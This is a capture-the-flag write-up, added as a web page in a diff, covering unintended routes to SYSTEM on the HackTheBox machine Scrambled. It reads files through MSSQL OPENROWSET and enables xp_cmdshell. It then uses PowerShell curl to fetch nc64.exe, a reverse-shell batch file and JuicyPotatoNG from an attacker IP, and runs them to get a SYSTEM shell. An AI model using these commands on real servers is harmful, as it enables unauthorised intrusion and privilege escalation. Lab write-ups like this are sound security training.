@@ -1,0 +1,143 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" data-toc-skip="" itemprop="name headline">HTB: Scrambled - Alternative Roots</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-scrambled">htb-scrambled</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#mssql">mssql</a> <a class="post-tag" href="/tags#mssql-file-read">mssql-file-read</a> <a class="post-tag" href="/tags#juicypotatong">juicypotatong</a> <a class="post-tag" href="/tags#xp-cmdshell">xp-cmdshell</a> <a class="post-tag" href="/tags#potato">potato</a> <a class="post-tag" href="/tags#seimpersonate">seimpersonate</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-10-01T13:45:00+00:00" itemprop="datePublished">Oct 1, 2022
+    </time>
+</p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<ul class="nav navbar-nav"><li><a href="/2022/10/01/htb-scrambled.html" style="color: #e6e6e6;">Intro</a></li><li><a href="/2022/10/01/htb-scrambled-win.html" style="color: #e6e6e6;">From Windows</a></li><li><a href="/2022/10/01/htb-scrambled-linux.html" style="color: #e6e6e6;">From Linux</a></li><li><a href="/2022/10/01/htb-scrambled-beyond-root.html" style="color: #e6e6e6;">Alternative Roots</a>
+<nav data-toggle="toc" id="toc"></nav></li>
+</ul>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<h2 id="alternative-roots">Alternative Roots</h2>
+<p>There were two unintended paths that I’m aware of, both of which abused MSSQL.</p>
+<h3 id="unintended-file-read-via-mssql">Unintended File Read Via MSSQL</h3>
+<p>Wh04m1 got root blood on Scrambled using this technique. <a href="https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/">This post on MSSQL Tips</a> talks about how to read a file using MSSQL using the <code class="language-plaintext highlighter-rouge">BULK</code> option, which was added to SQL Server 2005. Their example query is:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">BulkColumn</span> 
+<span class="k">FROM</span> <span class="n">OPENROWSET</span> <span class="p">(</span><span class="n">BULK</span> <span class="s1">'c:</span><span class="se">\t</span><span class="s1">emp</span><span class="se">\m</span><span class="s1">ytxtfile.txt'</span><span class="p">,</span> <span class="n">SINGLE_CLOB</span><span class="p">)</span> <span class="n">MyFile</span> 
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">OPENROWSET</code> returns a single column named <code class="language-plaintext highlighter-rouge">BulkColumn</code>. <code class="language-plaintext highlighter-rouge">MyFile</code> is a correlation name, which isn’t really important here other than it must exist, and it doesn’t really matter what I put there.</p>
+<p><code class="language-plaintext highlighter-rouge">OPENROWSET</code>, when used with the <code class="language-plaintext highlighter-rouge">BULK</code> provider takes a file path and one of three keywords:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">SINGLE_BLOB</code> returns as a <code class="language-plaintext highlighter-rouge">varbinary</code></li>
+<li><code class="language-plaintext highlighter-rouge">SINGLE_CLOB</code> returns as a <code class="language-plaintext highlighter-rouge">varchar</code></li>
+<li><code class="language-plaintext highlighter-rouge">SINGLE_NCLOB</code> returns as a <code class="language-plaintext highlighter-rouge">nvarchar</code></li>
+</ul>
+<p>So to read <code class="language-plaintext highlighter-rouge">root.txt</code>, I’ll run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span><span class="k">SELECT</span> <span class="n">BulkColumn</span> <span class="k">FROM</span> <span class="n">OPENROWSET</span><span class="p">(</span><span class="n">BULK</span> <span class="s1">'C:</span><span class="se">\u</span><span class="s1">sers</span><span class="se">\a</span><span class="s1">dministrator</span><span class="se">\d</span><span class="s1">esktop</span><span class="se">\r</span><span class="s1">oot.txt'</span><span class="p">,</span> <span class="n">SINGLE_CLOB</span><span class="p">)</span> <span class="n">MyFile</span>
+<span class="go">BulkColumn
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+
+b'a01b823bd0d7c97c98646d36d1d03c02\r\n' 
+</span></code></pre></div></div>
+<h3 id="roguepotato">RoguePotato</h3>
+<h4 id="get-execution-via-mssql">Get Execution Via MSSQL</h4>
+<p>To get to a place where I could run RoguePotato, I’ll need to be executing with the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>. I’m most likely to find this through the MSSQL service.</p>
+<p>To run commands via MSSQL, I’ll use the <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> stored procedure. If I try to run this initially, it will fail:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span><span class="n">xp_cmdshell</span> <span class="n">whoami</span>
+<span class="go">[-] ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+</span></code></pre></div></div>
+<p>I can reconfigure that with the <a href="https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16">following four lines</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span><span class="k">EXECUTE</span> <span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span> <span class="mi">1</span>
+<span class="go">[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+</span><span class="gp">SQL&gt;</span><span class="w"> </span><span class="n">RECONFIGURE</span>
+<span class="gp">SQL&gt;</span><span class="w"> </span><span class="k">EXECUTE</span> <span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="mi">1</span>
+<span class="go">[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+</span><span class="gp">SQL&gt;</span><span class="w"> </span><span class="n">RECONFIGURE</span>
+</code></pre></div></div>
+<p>Now it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span><span class="n">xp_cmdshell</span> <span class="n">whoami</span>
+<span class="go">output
+
+--------------------------------------------------------------------------------
+
+scrm\sqlsvc
+
+NULL   
+</span></code></pre></div></div>
+<h4 id="privilege-check">Privilege Check</h4>
+<p>The service is running as scrm\sqlsvc, which does have <code class="language-plaintext highlighter-rouge">SeImpersonate</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span><span class="n">xp_cmdshell</span> <span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span>
+<span class="go">output
+--------------------------------------------------------------------------------
+NULL
+PRIVILEGES INFORMATION
+----------------------
+NULL
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+NULL
+</span></code></pre></div></div>
+<h4 id="juicypotatong">JuicyPotatoNG</h4>
+<p>RoguePotato will work on Scrambled, but I’ll use this opportunity to show off <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a>, the latest Potato which was released just over a week before Scrambled retired.</p>
+<p>The details of the exploit can be found <a href="https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/">on decoder.cloud</a>, and involve a significant understanding of Windows internals details.</p>
+<p>Practically speaking, I can download the compiled exe from the <a href="https://github.com/antonioCoco/JuicyPotatoNG/releases/latest">release page</a>, and serve it from my webserver along with two other files:</p>
+<ul>
+<li>
+<p><code class="language-plaintext highlighter-rouge">nc64.exe</code>, which I’ll use to get a reverse shell</p>
+</li>
+<li>
+<p><code class="language-plaintext highlighter-rouge">rev.bat</code>, which simply invokes <code class="language-plaintext highlighter-rouge">nc64.exe</code> to return a reverse shell to my VM:</p>
+<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">C</span>:\\programdata\\nc64.exe <span class="na">-e </span><span class="nb">cmd</span> <span class="m">10</span>.10.14.6 <span class="m">443</span>
+</code></pre></div> </div>
+</li>
+</ul>
+<p>Staging out of <code class="language-plaintext highlighter-rouge">C:\ProgramData\</code>, I’ll upload all three to Scrambled from MSSQL:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell powershell curl 10.10.14.6/nc64.exe <span class="nt">-outfile</span> C:<span class="se">\\</span>programdata<span class="se">\\</span>nc64.exe
+<span class="go">output
+--------------------------------------------------------------------------------
+NULL
+</span><span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell powershell curl 10.10.14.6/rev.bat <span class="nt">-outfile</span> C:<span class="se">\\</span>programdata<span class="se">\\</span>rev.bat
+<span class="go">output
+--------------------------------------------------------------------------------
+NULL
+</span><span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell powershell curl 10.10.14.6/JuicyPotatoNG.exe <span class="nt">-outfile</span> C:<span class="se">\\</span>programdata<span class="se">\\</span>jp.exe
+<span class="go">output
+--------------------------------------------------------------------------------
+NULL
+</span></code></pre></div></div>
+<p>Now with <code class="language-plaintext highlighter-rouge">nc</code> listening on my host, I’ll invoke JuicyPotatoNG:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell C:<span class="se">\\</span>programdata<span class="se">\\</span>jp.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\\</span>programdata<span class="se">\\</span>rev.bat
+<span class="go">output
+--------------------------------------------------------------------------------
+NULL
+NULL
+         JuicyPotatoNG
+         by decoder_it &amp; splinter_code
+NULL
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
+[+] CreateProcessWithTokenW OK
+[+] Exploit successful!
+NULL 
+</span></code></pre></div></div>
+<p>It reports success, and there is a shell running as SYSTEM at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.168 63184
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\Windows\system32&gt;</span><span class="nb">whoami</span>
+<span class="go">nt authority\system
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/10/01/htb-scrambled-beyond-root.html"></a>
+</article>
